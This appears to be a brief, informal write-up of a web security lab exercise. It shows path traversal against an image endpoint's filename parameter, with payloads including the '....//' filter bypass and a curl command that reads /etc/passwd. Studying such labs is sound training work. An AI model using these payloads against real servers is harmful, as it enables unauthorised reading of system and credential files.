1) visit the homepage and visit a product
2) we can notice here that thje path of the image starts with a prefix /var/www/images/

2) open the imaghe into another tab and change ?filename=/var/www/images/111.jpg to ?filename=../../../../../etc/passwd
but it is blocked 

so we try 
?filename=/var/www/images/../../../../../etc/passwd but nothing, so we try to see if the sanitization is done 

THEY WORK, so we can access to the file 


3) browsers will not show the results because the image has an error but we can use curl
     curl lab.net/image?filename=....//....//....//....//....//....//etc/passwd

4) in this way we can read the passwd file
